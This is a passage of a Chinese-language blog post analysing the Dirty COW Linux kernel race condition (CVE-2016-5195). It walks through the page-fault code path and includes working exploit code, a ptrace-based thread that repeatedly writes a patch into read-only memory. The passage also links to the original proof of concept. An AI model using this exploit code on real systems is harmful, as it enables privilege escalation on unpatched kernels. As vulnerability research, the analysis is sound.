class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))  <span class="comment">// remove the FOLL_WRITE FLAG?</span></span><br><span class="line">		*flags &amp;= ~FOLL_WRITE;                                  <span class="comment">// bring an bug;</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>faultin_page</code>的后续调用如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">faultin_page</span><br><span class="line">  handle_mm_fault</span><br><span class="line">    __handle_mm_fault</span><br><span class="line">      handle_pte_fault</span><br><span class="line">        FAULT_FLAG_WRITE &amp;&amp; !pte_write</span><br><span class="line">	  do_wp_page</span><br><span class="line">	    PageAnon() &lt;- <span class="keyword">this</span> is CoWed page already</span><br><span class="line">	    reuse_swap_page &lt;- page is exclusively ours</span><br><span class="line">	    wp_page_reuse</span><br><span class="line">	      maybe_mkwrite &lt;- dirty but RO again</span><br><span class="line">	      ret = VM_FAULT_WRITE</span><br></pre></td></tr></table></figure>

<p>简单的说，由于目前是尝试向一个只读内存写入内容，<code>faultin_page()</code>方法创建了一个<code>COW PAGE</code>中，而实际不会影响到实际的文件内容；但是，在<code>faultin_page</code> 的最后，罪恶的将<code>FOLL_WRITE</code>标记移除了，这就导致当上层函数<code>__get_user_pages</code> 进行retry再次进入</p>
<p><code>faultin_page</code>的时候，将不会再有写操作的意图<code>follow_page_mask</code>很有可能返回一个真实的内存页面回来；</p>
<p>可是，由于在处理<code>faultin_page</code>的时候，已经完成了写入操作，因此，retry 中的<code>follow_page_mask</code>调用应当是返回的<code>COW page</code> ，因而不会存在漏洞哇。那么这里就体现出了<code>madviseThread</code>的功能，不断的通过<code>madvise</code> 调用将Dirty Cow Page释放掉，最终达到如下的运行效果(偷图)：</p>
<p><img src="https://raw.githubusercontent.com/N1rv0us/N1rv0us.github.io/master/2022/09/05/CVE-2016-5195%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/2022-09-21-02-37-38-image.png" alt></p>
<p>即完成了对真实内存页面的写入操作；</p>
<h2 id="What’s-More"><a href="#What’s-More" class="headerlink" title="What’s More"></a>What’s More</h2><h3 id="Ptrace-的使用"><a href="#Ptrace-的使用" class="headerlink" title="Ptrace 的使用"></a>Ptrace 的使用</h3><p>在一些高版本的内核上，对<code>/proc/{pid}/mem</code> 文件时不允许被写入的；当然由于我复现该漏洞使用的是Pingpong Root的模拟器，内核版本非常低，并没有实际遇到上述情况。</p>
<p>但是，如果出现了不能直接写入的情况仍然是有办法触发该漏洞的，方法就是使用ptrace来尝试写入，只需要设置<code>TRACE_PEEKUSR</code> 即可向完成写操作，由于<code>/proc/{pid}/mem</code>本身就是提供给ptrace等调试功能使用的，内核仍会调用<code>mem_write</code> 尝试向<code>/proc/{pid}/mem</code>写入因而触发漏洞；</p>
<p>这部分功能，在exploit中也有相应的代码，即<code>ptraceThread</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">ptrace_memcpy</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *s;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *d;</span><br><span class="line"></span><br><span class="line">    d = dest;</span><br><span class="line">    s = src;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n &gt;= <span class="keyword">sizeof</span>(<span class="keyword">long</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (*((<span class="keyword">long</span> *) s) != *((<span class="keyword">long</span> *) d)) &#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(&amp;value, s, <span class="keyword">sizeof</span>(value));</span><br><span class="line">            <span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, d, value) == <span class="number">-1</span>) &#123;</span><br><span class="line">                warn(<span class="string">"ptrace(PTRACE_POKETEXT)"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        n -= <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        d += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        s += <span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        d -= <span class="keyword">sizeof</span>(<span class="keyword">long</span>) - n;</span><br><span class="line"></span><br><span class="line">        errno = <span class="number">0</span>;</span><br><span class="line">        value = ptrace(PTRACE_PEEKTEXT, pid, d, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="number">-1</span> &amp;&amp; errno != <span class="number">0</span>) &#123;</span><br><span class="line">            warn(<span class="string">"ptrace(PTRACE_PEEKTEXT)"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;value + <span class="keyword">sizeof</span>(value) - n, s, n);</span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_POKETEXT, pid, d, value) == <span class="number">-1</span>) &#123;</span><br><span class="line">            warn(<span class="string">"ptrace(PTRACE_POKETEXT)"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *<span class="title">ptraceThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_arg</span> *<span class="title">mem_arg</span>;</span></span><br><span class="line">    mem_arg = (struct mem_arg *)arg;</span><br><span class="line"></span><br><span class="line">    LOGV(<span class="string">"[*] ptrace thread starts, address %p, size %zd"</span>, mem_arg-&gt;offset, mem_arg-&gt;patch_size);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!mem_arg-&gt;stop) &#123;</span><br><span class="line">        c += ptrace_memcpy(pid, mem_arg-&gt;offset, mem_arg-&gt;patch, mem_arg-&gt;patch_size);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    LOGV(<span class="string">"[*] ptrace thread stops, return code sum %d, iterations %i"</span>, c, i);</span><br><span class="line"></span><br><span class="line">    mem_arg-&gt;stop = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="关于条件竞争利用的效率问题"><a href="#关于条件竞争利用的效率问题" class="headerlink" title="关于条件竞争利用的效率问题"></a>关于条件竞争利用的效率问题</h3><blockquote>
<p>Unfortunately, you might have guessed it. The answer is the window is actually pretty big, Dirty COW can be triggered pretty reliably even on a single core machine, owing no less to the fact that <code>__get_user_pages</code> is explicitly asking the task scheduler to switch to another thread if necessary by calling <code>cond_resched</code> for each retry!</p>
</blockquote>
<h3 id="对比下正常的文件写入为何不会触发DirtyCow"><a href="#对比下正常的文件写入为何不会触发DirtyCow" class="headerlink" title="对比下正常的文件写入为何不会触发DirtyCow"></a>对比下正常的文件写入为何不会触发DirtyCow</h3><p>我们直接尝试写入一个只读文件，而非<code>proc/{pid}/mem</code> 会不会也会出现DirtyCow漏洞呢？</p>
<p>当然不会，我们会直接得到一个最令人头大的<code>segmentation fault</code></p>
<p>但由于<code>proc/{pid}/mem</code> 是提供给ptrace用于调试的，可能因此才会进行一次Dirty mark Cow Page的操作；</p>
<p>而当我们尝试直接向只读文件写入，会交给内核的MMU模块处理，调用到如下的函数进行处理：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> noinline <span class="keyword">void</span></span><br><span class="line">__do_page_fault(struct pt_regs *regs, <span class="keyword">unsigned</span> <span class="keyword">long</span> error_code,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> address)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... snip ... */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(access_error(error_code, vma))) &#123;</span><br><span class="line">        <span class="comment">/* Let's skip handle_mm_fault, here comes SIGSEGV!!! */</span></span><br><span class="line">        bad_area_access_error(regs, error_code, address, vma);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* I'm here... */</span></span><br><span class="line">    fault = handle_mm_fault(mm, vma, address, flags);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... snip ... */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>相对于<code>faultin_page</code>的处理流程，<code>bad_area_access_error</code>会果断的抛出<code>SIGSEGV</code>信号而不进行<code>handle_mm_fault</code>处理，因此，也就不会有<code>Dirty marked Cow PAGE</code>出现</p>
<h2 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h2><ul>
<li><p><a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c" target="_blank" rel="noopener">原始poc</a></p>
</li>
<li><p><a href="https://github.com/timwr/CVE-2016-5195" target="_blank" rel="noopener">proof of concept for Android</a></p>
</li>
<li><p><a href="https://chao-tic.github.io/blog/2017/05/24/dirty-cow" target="_blank" rel="noopener">Dirty COW and why lying is bad even if you are the Linux kernel</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/0xJDchen/p/6015476.html" target="_blank" rel="noopener">深入分析CVE-2016-5195 Dirty Cow - 0xJDchen - 博客园</a></p>
</li>
<li><p><a href="https://f0rm2l1n.github.io/2020-06-06-CVE-2016-5195/" target="_blank" rel="noopener">CVE-2016-5195</a></p>
</li>
<li><p><a href="https://www.oreilly.com/library/view/understanding-the-linux/0596005652/ch15s03.html" target="_blank" rel="noopener">15.3. Writing Dirty Pages to Disk - Understanding the Linux Kernel, 3rd Edition [Book]</a></p>
</li>
<li><p><a href="https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux" target="_blank" rel="noopener">kernel - How do I read from /proc/$pid/mem under Linux? - Unix &amp; Linux Stack Exchange</a></p>
</li>
<li><p><a href="https://man7.org/linux/man-pages/man2/madvise.2.html" target="_blank" rel="noopener">madvise sys_call</a></p>
</li>
</ul>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/kernel-pwn/" rel="tag"># kernel pwn</a>
          
            <a href="/tags/android/" rel="tag"># android</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2022/08/23/CVE-2015-3636复现的补充部分/" rel="next" title="从PingPong Root学习ret2dir&PXN绕过">
                <i class="fa fa-chevron-left"></i> 从PingPong Root学习ret2dir&PXN绕过
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2022/10/09/CVE-2019-2215复现与分析/" rel="prev" title="CVE-2019-2215 漏洞复现与分析">
                CVE-2019-2215 漏洞复现与分析 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">N1rv0us</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">19</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">21</span>
                  <span class="site-state-item-name">tags</span>
                
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Brief"><span class="nav-number">1.</span> <span class="nav-text">Brief</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#POC-与一些内核基础"><span class="nav-number">2.</span> <span class="nav-text">POC 与一些内核基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CheckThread"><span class="nav-number">2.1.</span> <span class="nav-text">CheckThread</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#madviseThread"><span class="nav-number">2.2.</span> <span class="nav-text">madviseThread</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#procselfmemThread"><span class="nav-number">2.3.</span> <span class="nav-text">procselfmemThread</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理分析与梳理"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理分析与梳理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#What’s-More"><span class="nav-number">4.</span> <span class="nav-text">What’s More</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ptrace-的使用"><span class="nav-number">4.1.</span> <span class="nav-text">Ptrace 的使用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于条件竞争利用的效率问题"><span class="nav-number">4.2.</span> <span class="nav-text">关于条件竞争利用的效率问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对比下正常的文件写入为何不会触发DirtyCow"><span class="nav-number">4.3.</span> <span class="nav-text">对比下正常的文件写入为何不会触发DirtyCow</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#REFERENCE"><span class="nav-number">5.</span> <span class="nav-text">REFERENCE</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">N1rv0us</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
